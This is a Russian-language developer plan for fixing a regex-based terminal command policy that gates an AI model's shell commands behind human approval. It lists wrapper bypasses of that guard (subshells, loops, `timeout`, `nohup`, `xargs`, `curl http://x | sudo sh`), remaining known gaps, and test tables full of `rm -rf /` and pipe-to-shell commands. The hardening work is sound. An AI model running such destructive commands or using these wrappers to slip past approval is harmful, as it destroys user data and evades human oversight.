# T05. Политика терминала: обёртки команд

Источник задачи: `docs/audit_remediation_plan_2026-09-04.md` (раздел «T05. Политика терминала:
обёртки команд»), находка `docs/architecture_code_review_2026-09-04.md` §4.4 «Обход политики
терминала обёртками» (CERTAIN, исполнено). Роль этого документа — план для разработчика; код
не менялся, только прочитан и проверен экспериментально на копии модуля вне репозитория (см.
«Верификация дизайна» и «Команды проверки»).

Простыми словами: `bot/command_policy.py` — это фильтр, который смотрит на текст команды,
которую модель просит выполнить в терминале, и решает: пропустить как есть (`allow`),
пропустить только после подтверждения человеком (`require_approval`) или отказать совсем
(`deny`). Фильтр смотрит не на реальный запуск shell (полноценного парсера shell в проекте
нет — см. docstring `bot/command_policy.py:4-11`), а на нормализованный (упрощённый,
"расквоченный") текст команды и ищет в нём опасные слова на месте команды: `rm -rf`,
`git push -f`, `DROP TABLE`, `curl … | sh` и т.д. Проблема T05 в том, что если опасную команду
обернуть в скобки, `for`/`if`, или в служебные обёртки типа `timeout`/`nohup`/`xargs`, фильтр
её не узнаёт и пропускает как `allow`, хотя без обёртки узнаёт и требует подтверждения.

## Цель

Научить `evaluate_command()` (`bot/command_policy.py:434`) распознавать опасную команду не
только «голой», но и:

1. обёрнутой в группирующие скобки `( … )` / `{ …; }`;
2. внутри `for … do … done`, `if … then … fi`, `while … do … done` (общий случай: `; do`,
   `; then`, `; else`);
3. за служебными командами-обёртками `timeout N[s]`, `nohup`, `xargs [опции]`, `nice -n N`,
   `stdbuf …`, `time`, `command`, `builtin` (уже поддержаны `sudo`/`env`, но не как часть
   произвольной цепочки с новыми словами);
4. в правиле «pipe в shell»: добавить `sudo`/интерпретаторы Python/Perl/Ruby как цель пайпа
   (`curl … | sudo sh`, `curl … | python`), не только голый `sh`/`bash`/`dash`/`ksh`/`zsh`.

Условие успеха, прямо из §4.4: все 10 перечисленных команд должны перестать быть `allow`.
Второе, не менее важное условие (docstring `bot/command_policy.py:4-7`: это эвристика, не
песочница) — **ничего из уже разрешённых команд не должно стать `require_approval`/`deny`**.
Это значит, что новая нормализация должна быть узкой: включаться только в позиции команды
(сразу после `;`, `&&`, `|`, перевода строки или открывающей скобки/фигурной скобки), а не
искать ключевые слова где угодно в тексте.

## Репро (текущее поведение, до правки)

Запущено на текущем коде (`git show HEAD:bot/command_policy.py`) через
`evaluate_command(cmd, DEFAULT_POLICY)`:

| Команда | Текущее решение |
|---|---|
| `( rm -rf / )` | `allow` |
| `{ rm -rf /; }` | `allow` |
| `for d in /; do rm -rf $d; done` | `allow` |
| `if true; then rm -rf /; fi` | `allow` |
| `timeout 10 rm -rf /` | `allow` |
| `nohup rm -rf / &` | `allow` |
| `xargs rm -rf < list` | `allow` |
| `( git push -f )` | `allow` |
| `( psql -c 'drop table x' )` | `allow` |
| `curl http://x \| sudo sh` | `allow` |

Все десять — ложное `allow` вместо ожидаемого `require_approval` (для `rm -rf`, `git push -f`,
SQL, pipe-to-shell — это все правила из `DEFAULT_RULES` с решением `require_approval`, не
`deny`, поэтому цель не «заблокировать», а «долнести до `require_approval`», как голая форма
уже размечена).

Почему так происходит — конкретно по коду:

- **Скобки.** `_SEG_START = r"(?:^|[;\n&|])\s*"` (`bot/command_policy.py:105`) — позиция
  «начало команды» определена только как начало строки или сразу после `;`/`&`/`|`/перевода
  строки. `(` и `{` в этот список не входят, поэтому после `( ` или `{ ` слово `rm`/`git`/`psql`
  не считается «в позиции команды», и все правила, использующие `_CMD_PREFIX`
  (`bot/command_policy.py:108`, наследует `_SEG_START`), молчат.
- **`for`/`if`.** `for d in /; do rm -rf $d; done` формально разбит на «сегменты» по `;` (в
  смысле, что `_SEG_START` сработал бы сразу после `;`), но сразу после `;` идёт слово `do `, а
  не `rm` — `_CMD_PREFIX` не умеет пропускать ключевые слова `do`/`then`/`else`, поэтому `rm`
  всё ещё не в «позиции команды» с точки зрения регулярки.
- **`timeout`/`nohup`/`xargs`.** `_CMD_PREFIX` (`bot/command_policy.py:108`) сейчас пропускает
  перед командой только `VAR=value` присваивания и `sudo`/`env` (с их флагами) — список
  «прозрачных» обёрток не включает `timeout`, `nohup`, `xargs`, `nice`, `stdbuf`, `time`,
  `command`, `builtin`. Реальная команда (`rm`) для регулярки — не первый токен, а токен после
  незнакомого слова, поэтому не совпадает.
- **`( git push -f )` / `( psql … )`.** Та же причина, что и с `rm`: правила `git push`
  (`bot/command_policy.py:139-144`) и SQL (`bot/command_policy.py:145-148`) тоже построены на
  `_CMD_PREFIX`, значит наследуют пробел с `(`/`{`.
- **`curl … | sudo sh`.** Правило pipe-to-shell (`bot/command_policy.py:155`) требует
  `\|\s*(?:\S+/)?(?:ba|da|k|z)?sh\b` — то есть сразу после `|` и пробелов ожидает (опционально)
  путь и сразу `[ba|da|k|z]sh`. `sudo` между `|` и `sh` не предусмотрен, как и запуск через
  `python`/`perl`/`ruby` (которые уже перечислены в `_INTERPRETER_NAMES`, но только для splice
  после `-c`, не для этого правила).

Важный смежный факт, обнаруженный при чтении: почти тот же дефект (пропуск `(` как позиции
начала команды) уже когда-то чинили точечно только для одного правила — `pip install
--break-system-packages`. Его паттерн (`bot/command_policy.py:92-99`) использует **свой,
отдельный** якорь `(?:^|[;&(]\s*)`, не общий `_SEG_START`, и уже включает `(` (хотя не `{`, не
`\n`, не `|`). Это подтверждает, что тип бага реален и его уже частично осознавали, но исправили
не в общем месте, а дублированием. План ниже устраняет источник дублирования вместо создания
четвёртой копии того же класса символов.

## Дизайн нормализации

Коротко: три независимых, узких изменения — (A) расширить набор символов «начало команды» на
`(`/`{`; (B) научить нормализатор превращать `; do`/`; then`/`; else` в границу сегмента
(так же, как уже делается для `-c` у интерпретаторов); (C) расширить список
«прозрачных» команд-обёрток и цель pipe-to-shell. Ничего не парсится по-настоящему — это те же
регулярки поверх текста, что и сейчас, просто с более широким списком «что считать позицией
команды».

### (A) `(` и `{` как границы сегмента

Сейчас `_SEG_START` и (независимо, тем же литералом) `_INTERPRETER_DASH_C_RE`
(`bot/command_policy.py:105`, `:119-122`) держат один и тот же набор символов `;\n&|` в двух
местах. Выносим его в общую константу и добавляем `(`/`{`:

```python
# Segment-boundary characters: `;`, `&` (covering `&&`), `|` (covering `||`), newline,
# and the two grouping openers `(` (subshell) / `{` (brace group) — a command right
# after either opener is in command position exactly like after `;`/`&&`/a newline,
# e.g. `( rm -rf / )` or `{ rm -rf /; }`. Shared by _SEG_START and the interpreter
# -c splice below so both learn about a new opener in one place.
_SEG_BOUNDARY_CHARS = r";\n&|({"
# Segment-boundary anchor: true start of string, or right after one of the above.
_SEG_START = r"(?:^|[" + _SEG_BOUNDARY_CHARS + r"])\s*"
```

и там, где раньше был инлайновый литерал `(?:^|[;\n&|])`:

```python
_INTERPRETER_DASH_C_RE = re.compile(
    r"((?:^|[" + _SEG_BOUNDARY_CHARS + r"])\s*(?:\S+/)?" + _INTERPRETER_NAMES + r"\b(?:\s+-{1,2}\S+)*?\s+-[^-\s]*c)(\s+)",
    re.IGNORECASE,
)
```

Побочный эффект (в плюс, не запрошен явно задачей, но бесплатен и закрывает соседний пробел
того же типа): `( bash -c "rm -rf /" )` и `{ bash -c "rm -rf /"; }` тоже начинают ловиться,
потому что `-c`-сплайсинг раньше тоже не знал про `(`/`{`. Проверено экспериментально (см.
«Верификация дизайна»).

`)`/`}` в набор не добавляются — они не нужны для матчинга (см. проверку ниже: `_SEG_REST`
и так не исключает эти символы, значит опасный флаг после `rm -rf` находится, даже если после
него в этом же «сегменте» остаётся хвостовой `)`), а как отдельная граница sегмента они не
нужны, потому что `.search()` пробует все позиции независимо, а не последовательно режет
строку по сегментам.

### (B) `; do` / `; then` / `; else` как граница сегмента

По аналогии с уже существующим сплайсингом `-c` (`bot/command_policy.py:119-126`,
`normalize_command` строки `368-369`) добавляем второй сплайсинг — после `; do`/`; then`/`; else`
вставляется перевод строки (который уже входит в `_SEG_BOUNDARY_CHARS`, значит остальной код
никаких дополнительных изменений не требует):

```python
# Splices a segment boundary (newline) right after a `; do`/`; then`/`; else` clause
# keyword so the command that follows is scanned in its own command position, e.g.
# `for d in /; do rm -rf $d; done` -> `for d in /; do\nrm -rf $d; done`. Anchored on a
# preceding `;` (the only place POSIX shell grammar allows these keywords to open a new
# command list) so a `do`/`then`/`else` that happens to appear as a plain argument
# elsewhere is never spliced.
_CLAUSE_KEYWORD_RE = re.compile(r"(;\s*(?:do|then|else)\b)(\s+)", re.IGNORECASE)
```

Якорь — обязательное `;` перед словом (как и просит формулировка задачи: «разбиение по
`; do `, `; then `, `; else `»), а не голое слово `do`/`then`/`else` где угодно в строке. Это
осознанный выбор в пользу узости: `do`/`then`/`else` как обычные слова в аргументах (`echo do
or die`, `grep -r nohup .`) не должны провоцировать ложное срабатывание, а по грамматике POSIX
shell эти ключевые слова открывают список команд только после `;` или перевода строки, так что
привязка к `;` не теряет ни одного целевого случая из задачи. `elif` не включён отдельно —
`elif COND; then CMD` всё равно ловится через `; then`; если понадобится поймать команду сразу
после `elif` (`elif rm -rf /; then …` — само условие не является запуском произвольной
команды в типичном случае, а `elif` не встречается в репро-списке задачи), это тривиально
дописать в альтернативу `(?:do|then|else|elif)`, но в текущий скоуп не включаем (нет
подтверждённого репро-кейса, минимальность правки).

Добавляем вызов в конец `normalize_command()` (сейчас `bot/command_policy.py:368-369`):

```python
    normalized = _normalize_at_depth(text, 0)
    normalized = _INTERPRETER_DASH_C_RE.sub(lambda m: m.group(1) + "\n", normalized)
    return _CLAUSE_KEYWORD_RE.sub(lambda m: m.group(1) + "\n", normalized)
```

### (C) Список обёрток в `_CMD_PREFIX` и цель pipe-to-shell

Сейчас (`bot/command_policy.py:106-108`):

```python
_CMD_PREFIX = _SEG_START + r"(?:[A-Za-z_]\w*=\S*\s+)*(?:(?:sudo|env)\s+(?:-\S+\s+)*)*(?:\S*/)?"
```

Заменяем на список обёрток с их аргументами, допускающий произвольную цепочку (`sudo env
FOO=bar nice -n 19 rm -rf /` тоже должен работать, а не только одна обёртка):

```python
# Wrapper commands that pass their trailing argument through to a real command in the
# same command position: privilege/env (`sudo`, `env`), scheduling/monitoring
# (`timeout`, `nohup`, `nice`, `stdbuf`, `time`), batch execution (`xargs`), and the
# shell builtins that force literal/builtin lookup (`command`, `builtin`). Matched only
# at a segment boundary (via _CMD_PREFIX below), so a filename or argument that happens
# to spell one of these words elsewhere in a command is never treated as a wrapper.
_WRAPPER_WORD = r"(?:sudo|env|timeout|nohup|nice|stdbuf|time|xargs|command|builtin)"
# One wrapper's own argument: a `-flag` (bundled or with attached value, e.g. `-n`,
# `-oL`), a bare duration/number (`timeout 10`, `nice -n 19`), or a VAR=value
# assignment (`env FOO=bar`). Bounded and specific on purpose: this must not swallow
# the real command name that follows the wrapper.
_WRAPPER_ARG = r"(?:-\S+|\d+[smhd]?|[A-Za-z_]\w*=\S*)"
# Command position within a segment: optional leading VAR=value assignments, then zero
# or more stacked wrapper words each with its own zero-or-more args (covers chains like
# `sudo env FOO=bar nice -n 19`), then an optional path prefix before the command.
_CMD_PREFIX = (
    _SEG_START
    + r"(?:[A-Za-z_]\w*=\S*\s+)*"
    + r"(?:" + _WRAPPER_WORD + r"\b\s+(?:" + _WRAPPER_ARG + r"\s+)*)*"
    + r"(?:\S*/)?"
)
```

`xargs` семантически не совсем «обёртка вокруг одной команды» (это утилита, которая запускает
переданную команду много раз для каждой строки stdin/аргументов), но с точки зрения текста
команды `xargs rm -rf < list` реальная опасная команда — `rm -rf` — синтаксически идёт сразу
после `xargs [флаги]`, ровно как после `sudo`/`nice`, так что общий механизм подходит без
отдельного правила.

Правило pipe-to-shell (`bot/command_policy.py:155`) сейчас:

```python
CommandRule(
    pattern=_CMD_PREFIX + r"curl\b" + _SEG_REST + r"\|\s*(?:\S+/)?(?:ba|da|k|z)?sh\b",
    decision="require_approval",
    reason="pipe-to-shell",
),
```

Меняем цель пайпа на переиспользование уже существующего `_INTERPRETER_NAMES`
(`bot/command_policy.py:113`, там уже есть `python3?`/`perl`/`ruby`, лишнего списка заводить не
нужно) и добавляем необязательный `sudo` сразу после `|`:

```python
CommandRule(
    pattern=_CMD_PREFIX + r"curl\b" + _SEG_REST
    + r"\|\s*(?:sudo\s+)?(?:\S+/)?" + _INTERPRETER_NAMES + r"\b",
    decision="require_approval",
    reason="pipe-to-shell",
),
```

`(?:ba|da|k|z)?sh` — старый способ написать «sh, bash, dash, ksh или zsh» одним куском — заменяется на
`_INTERPRETER_NAMES`, которое покрывает тот же набор плюс `python`/`python3`/`perl`/`ruby`, то
есть строго шире, без потери старых случаев (проверено на матрице тестов, см. ниже).

## Правки по file:line

Текущие (до правки) номера строк в `bot/command_policy.py`:

| Что | Где сейчас | Что делать |
|---|---|---|
| Блок констант границ/префикса | `:104-111` (`_SEG_START`, `_CMD_PREFIX`, `_SEG_REST`) | Заменить на блок из раздела (A)+(C) выше: добавить `_SEG_BOUNDARY_CHARS`, `_WRAPPER_WORD`, `_WRAPPER_ARG`, переписать `_SEG_START`/`_CMD_PREFIX` |
| `_INTERPRETER_DASH_C_RE` | `:119-122` | Заменить инлайновый `(?:^|[;\n&|])` на `(?:^|[" + _SEG_BOUNDARY_CHARS + "])` |
| Новая константа `_CLAUSE_KEYWORD_RE` | добавить после `_INTERPRETER_DASH_C_RE`, перед `_RM_HEAD_ALT` (после `:126`, до `:128`) | Новый код из раздела (B) |
| pipe-to-shell правило | `:155` | Заменить паттерн, как в разделе (C) |
| `normalize_command()` хвост | `:368-369` | Добавить вызов `_CLAUSE_KEYWORD_RE.sub(...)` после существующего `_INTERPRETER_DASH_C_RE.sub(...)`, как в разделе (B) |

`_RM_HEAD_ALT` (`:128`) и `evaluate_command()` (`:434`) из задачи — трогать не нужно: они уже
берут `_CMD_PREFIX`/`_SEG_START` как есть, значит унаследуют исправление автоматически, без
собственных правок. Это подтверждено экспериментально (раздел «Верификация дизайна»).

Не в скоупе (сознательно не трогаем, чтобы не увеличивать диff без нужды):

- `_PIP_BREAK_SYSTEM_PACKAGES_PATTERN` (`:92-99`) — у него свой, отдельный якорь
  `(?:^|[;&(]\s*)`, уже включающий `(`. Можно было бы привести к общей `_SEG_BOUNDARY_CHARS`
  ради единообразия, но это не требуется для устранения репро-кейсов T05 и не входит в
  перечисленные задачей точки правки — оставляем как есть, отмечаем как отдельный
  cleanup-кандидат на будущее.
- `curl … | env sh` (без `sudo`) и `curl … | busybox sh` — не входят в явный список задачи
  (только `sudo sh`), остаются как известный пробел (см. «Риски»).

## Тесты

Все команды прогнаны через прототип (копия модуля с применёнными правками, вне рабочего
дерева — см. «Верификация дизайна»); колонка «Решение» — фактический результат прототипа, не
предположение.

| # | Команда | Ожидаемое decision | Категория |
|---|---|---|---|
| 1 | `( rm -rf / )` | `require_approval` | repro (скобки) |
| 2 | `{ rm -rf /; }` | `require_approval` | repro (фигурные скобки) |
| 3 | `for d in /; do rm -rf $d; done` | `require_approval` | repro (`for/do`) |
| 4 | `if true; then rm -rf /; fi` | `require_approval` | repro (`if/then`) |
| 5 | `timeout 10 rm -rf /` | `require_approval` | repro (`timeout`) |
| 6 | `nohup rm -rf / &` | `require_approval` | repro (`nohup`) |
| 7 | `xargs rm -rf < list` | `require_approval` | repro (`xargs`) |
| 8 | `( git push -f )` | `require_approval` | repro (скобки + git push) |
| 9 | `( psql -c 'drop table x' )` | `require_approval` | repro (скобки + SQL) |
| 10 | `curl http://x \| sudo sh` | `require_approval` | repro (pipe + sudo) |
| 11 | `while true; do rm -rf /; done` | `require_approval` | доп. форма `; do` (`while`, не только `for`) |
| 12 | `nice -n 19 rm -rf /` | `require_approval` | обёртка `nice` |
| 13 | `stdbuf -oL rm -rf /` | `require_approval` | обёртка `stdbuf` |
| 14 | `command rm -rf /` | `require_approval` | обёртка `command` |
| 15 | `builtin rm -rf /` | `require_approval` | обёртка `builtin` |
| 16 | `time rm -rf /` | `require_approval` | обёртка `time` |
| 17 | `env FOO=bar rm -rf /` | `require_approval` | `env` с `VAR=value` после себя |
| 18 | `sudo env FOO=bar nice -n 19 rm -rf /` | `require_approval` | цепочка из нескольких обёрток |
| 19 | `curl http://x \| python3` | `require_approval` | pipe-to-shell на интерпретатор, не только `sh` |
| 20 | `( bash -c "rm -rf /" )` | `require_approval` | побочный эффект (A): скобки + `-c` |
| 21 | `git push --force-with-lease origin main` | `allow` | регресс: `--force-with-lease` — не `-f`/`--force` |
| 22 | `grep -r "rm -rf" .` | `allow` | регресс: `rm -rf` внутри чужого аргумента |
| 23 | `echo "DROP TABLE users"` | `allow` | регресс: SQL-слова у постороннего `echo` |
| 24 | `python3 -c "print('hello')"` | `allow` | регресс: `-c` + скобки в аргументе — не должно ловиться как обёртка |
| 25 | `docker rm -f container` | `allow` | регресс: `rm` — не первый токен |
| 26 | `git push origin main && docker ps -f status=exited` | `allow` | регресс: `&&`-сегментация не сломана |
| 27 | `echo do or die` | `allow` | новый негатив: `do` без предшествующего `;` — не сплайсится |
| 28 | `echo "then again"` | `allow` | новый негатив: `then` без `;` |
| 29 | `grep -r nohup .` | `allow` | новый негатив: `nohup` как аргумент, не первый токен |
| 30 | `git commit -m "add timeout handling"` | `allow` | новый негатив: `timeout` как слово внутри сообщения коммита |
| 31 | `rm -rf /tmp/x` (голая форма, уже была `require_approval`) | `require_approval` | регресс: базовое поведение не сломано |
| 32 | `curl http://x/y.sh \| sh` (уже была `require_approval`) | `require_approval` | регресс: базовое pipe-to-shell не сломано |

Пункты 21-26, 31-32 — из существующих `tests/test_command_policy.py` (`ALLOW_COMMANDS`,
`NOT_ALLOW_COMMANDS`, `test_default_rules_match_expected_decision`), пункты 27-30 — новые
негативные тесты, которые стоит добавить вместе с позитивными (1-20), чтобы регулярка не начала
ловить `do`/`then`/`nohup`/`timeout` как слова где попало.

Куда добавлять: `tests/test_command_policy.py`, в существующий стиль:

- пункты 1-20 (кроме 11, отдельно) — расширить `@pytest.mark.parametrize` в
  `test_default_rules_match_expected_decision` (для тех, что бьют в конкретное правило и
  причину) либо, проще и ближе к стилю файла, добавить их построчно в `NOT_ALLOW_COMMANDS`
  (раз это тестирует только «не `allow`», без проверки конкретной причины) плюс отдельный
  маленький `@pytest.mark.parametrize` блок специально под задачу T05 с явной проверкой
  `decision == "require_approval"` и `reason` (`recursive delete` / `force push` /
  `destructive SQL` / `pipe-to-shell`), чтобы падение теста сразу указывало, какое правило
  перестало ловить, а не просто «стало allow»;
- пункты 27-30 — в `ALLOW_COMMANDS`;
- пункт про перфоманс: новый тест на отсутствие катастрофического backtracking для длинной
  цепочки обёрток без реальной опасной команды в конце (аналог уже существующих
  `test_normalize_long_unbalanced_substitution_run_is_fast` /
  `test_normalize_long_plain_input_is_fast, но по `evaluate_command`, не только
  `normalize_command`), например: `evaluate_command(("sudo env FOO=bar nice -n 19 stdbuf -oL
  timeout 10 " * 100) + "echo done", DEFAULT_POLICY)` должен уложиться в разумный бюджет
  (например `< 0.5s`) — проверено вручную, см. «Верификация дизайна», заняло `~5 мс` на
  тексте в 5 КБ.

## Верификация дизайна (уже сделано в рамках планирования)

Поскольку планировщику нельзя менять код в рабочем дереве, дизайн проверен на копии модуля вне
репозитория (не в git-дереве проекта, не коммитилось, не влияет на рабочее дерево):

1. Скопирован `bot/command_policy.py` в `/tmp/cp_proto/command_policy_proto.py`, применены
   правки (A)+(B)+(C) построчной заменой через `python3 -c` (без `sed`, чтобы не исказить
   многострочные регулярки).
2. Прогнаны напрямую через прототип: все 10 репро-команд из аудита (результат:
   `require_approval`/`deny`, как ожидалось — таблица выше), полная матрица `ALLOW_COMMANDS` /
   `NOT_ALLOW_COMMANDS` из `tests/test_exemplar_terminal_command_guard.py` (0 регрессий), плюс
   тесты на `normalize_command` (unquote, ANSI-C, `$(...)`/backtick-раскрытие, heredoc-обрезка,
   10-уровневая вложенность, антибэктрекинг на `"("` × 20000 и на 1 МБ обычного текста) — все
   прошли без изменений в поведении, кроме целевых.
3. Отдельно собрана полная копия репозитория в `/tmp/cp_repo_copy` (через `git archive HEAD`),
   в неё подставлен пропатченный `command_policy.py`, и на этой копии (не в рабочем дереве
   проекта) прогнан реальный набор тестов:

   ```
   cd /tmp/cp_repo_copy && python3 -m pytest tests/test_command_policy.py \
       tests/test_exemplar_terminal_command_guard.py tests/test_terminal_plugin.py \
       -q -p no:cacheprovider
   ```

   Результат: `69 passed`. Ни один существующий тест не задет.
4. Дополнительно проверены не входящие в задачу, но смежные конструкции — обнаружены и
   подтверждены как безопасные/ожидаемые: `env FOO=bar rm -rf /` (`require_approval`, за счёт
   поддержки `VAR=value` после обёртки), `sudo env FOO=bar nice -n 19 rm -rf /`
   (`require_approval`, цепочка обёрток), `elif true; then rm -rf /; fi` (`require_approval`,
   ловится через `; then`, хотя `elif` отдельно не добавлен), `echo do or die` / `grep -r nohup
   .` / `git commit -m "add timeout handling"` (все остаются `allow` — новые ключевые слова не
   ловятся как аргументы посторонних команд).
5. Замер производительности: цепочка из ~100 повторов `sudo env FOO=bar nice -n 19 stdbuf -oL
   timeout 10 ` (5 КБ, ниже `MAX_NORMALIZE_LENGTH=8192`) без реальной опасной команды в конце —
   `evaluate_command` отработал за ~5 мс; вложенные скобки `"(" * 4000 + "rm -rf /" + ")" *
   4000` (8 КБ, на границе лимита) — ~30 мс. Катастрофического backtracking не обнаружено.

## Команды проверки (для разработчика, который будет вносить правку)

```bash
# точечные тесты после правки
python3 -m pytest tests/test_command_policy.py tests/test_exemplar_terminal_command_guard.py \
    tests/test_terminal_plugin.py -q -p no:cacheprovider

# ручная проверка репро-кейсов из аудита
python3 -c "
from bot.command_policy import evaluate_command, DEFAULT_POLICY
for cmd in [
    '( rm -rf / )', '{ rm -rf /; }', 'for d in /; do rm -rf \$d; done',
    'if true; then rm -rf /; fi', 'timeout 10 rm -rf /', 'nohup rm -rf / &',
    'xargs rm -rf < list', '( git push -f )', \"( psql -c 'drop table x' )\",
    'curl http://x | sudo sh',
]:
    print(cmd, '->', evaluate_command(cmd, DEFAULT_POLICY))
"

# полный прогон, если правка затронула другие файлы (не должна была)
python3 -m pytest -q -p no:cacheprovider
```

## Риски

- **Это по-прежнему эвристика, не парсер** (docstring `bot/command_policy.py:4-11`) — новая
  нормализация закрывает конкретно перечисленные в аудите обходы, но не все мыслимые. Известные
  оставшиеся пробелы после этой правки:
  - `curl … | env sh`, `curl … | busybox sh`, `curl … | doas sh` — только `sudo` добавлен как
    промежуточное слово перед целью пайпа, не общий список «привилегированных обёрток». Задача
    явно просила `| sudo sh`, поэтому это не регрессия, а сознательно неполный скоуп; если
    нужно шире — переиспользовать `_WRAPPER_WORD` вместо хардкода `sudo` в pipe-правиле.
  - `case … in rm) rm -rf / ;; esac` — конструкция `case` не входит в `_CLAUSE_KEYWORD_RE`
    (не запрошена задачей, репро-кейса нет).
  - Арифметическое расширение `$(( … ))` и `[[ … ]]` — не проверялись специально; т.к.
    `_extract_top_level_substitutions` реагирует на `$(` независимо от того, что идёт после
    (арифметика `$((` тоже попадёт в парную обработку `$(...)`), риск ложного трактования как
    command-substitution есть и до этой правки, T05 её не меняет и не должна усугублять (не
    затронуто нашими правками — они только про `_SEG_START`/`_CMD_PREFIX`/pipe/`;do`).
- **Ширина `_WRAPPER_WORD` может дать ложные `require_approval` на легитимных обёртках**, если
  оператор реально хочет `nice -n 5 rm -rf /tmp/mycache` как штатную операцию — это ровно то
  же поведение, что сегодня уже есть для голого `rm -rf /tmp/mycache`
  (`require_approval`, не `deny`): пользователь подтверждает, работа не блокируется намертво.
  Значит расширение обёрток не меняет строгость решения (`require_approval`, а не `deny`),
  только область, где оно применяется — согласуется с текущей политикой.
- **Производительность.** Новый `_CMD_PREFIX` с вложенным `(?:WRAPPER_WORD ARGS*)*` теоретически
  мог дать катастрофический backtracking на adversarial-входе (много повторов слова-обёртки без
  реальной команды в конце). Проверено вручную (раздел «Верификация дизайна», п. 5) — линейное
  время, не экспоненциальное, в пределах `MAX_NORMALIZE_LENGTH`. Рекомендуется зафиксировать
  тестом производительности (пункт в разделе «Тесты»), чтобы будущая правка регулярки не внесла
  регресс незаметно.
- **`_CLAUSE_KEYWORD_RE` привязан к `;`.** Если модель сгенерирует многострочный `for`/`if` без
  `;` (частый человеческий стиль, реже — стиль LLM, который обычно пишет однострочные команды
  для `terminal`-тула), где `do`/`then` стоят на отдельной строке после реального перевода
  строки, а не после `;` — этот случай уже покрыт без изменений: перевод строки и так входит
  в `_SEG_BOUNDARY_CHARS`, значит `do`/`then` на отдельной строке — это уже сегмент сам по
  себе, а следующая строка после него — новый сегмент через `\n`, что регулярка `_CMD_PREFIX`
  и так видит (просто слово `do`/`then` само по себе не совпадёт ни с одним `_WRAPPER_WORD`,
  но это не страшно — реальная команда на следующей строке всё равно встанет в позицию начала
  сегмента). Отдельно проверить многострочный вариант рекомендуется тестом, но не блокирует
  внедрение.

## Критерии готовности

1. Все 10 репро-команд из `docs/architecture_code_review_2026-09-04.md` §4.4 дают
   `require_approval` (или `deny`, если бы совпали с fork-bomb/pip-правилом — в данном случае
   не совпадают) вместо `allow`.
2. `tests/test_command_policy.py::ALLOW_COMMANDS` и `::NOT_ALLOW_COMMANDS`
   (`tests/test_exemplar_terminal_command_guard.py`) остаются зелёными без изменения ожидаемых
   решений — то есть новая нормализация не потребовала перемещать ни одну существующую команду
   из одного списка в другой (в частности, `git push --force-with-lease` и `grep -r "rm -rf"
   .` остаются `allow`).
3. Новые позитивные (1-20) и негативные (27-30) кейсы из таблицы «Тесты» добавлены в
   `tests/test_command_policy.py` и проходят.
4. `python3 -m pytest tests/test_command_policy.py
   tests/test_exemplar_terminal_command_guard.py tests/test_terminal_plugin.py -q` — зелёный.
5. Полный `python3 -m pytest -q` не показывает новых падений вне затронутого модуля (правка
   ограничена `bot/command_policy.py`, других файлов не касается).


## Постскриптум после ревью (2026-09-04)

Ревью нашло квадратичный рост времени `evaluate_command` на «стене» из `(`/`{` без пробелов
(каждый новый символ-граница перезапускает поиск позиции команды): ~2 с на 20 КБ, ~55 с на
100 КБ, при этом `_guard_command` терминала выполняется синхронно в event loop. Исправление:
`evaluate_command` больше не сканирует строки длиннее `MAX_NORMALIZE_LENGTH` (8192) —
возвращает `require_approval` (в allowlist-режиме `deny`) с причиной «command longer than …
is not analyzed». Регрессионные тесты: `test_oversized_command_is_escalated_without_scanning`,
`test_paren_wall_at_limit_is_fast`.
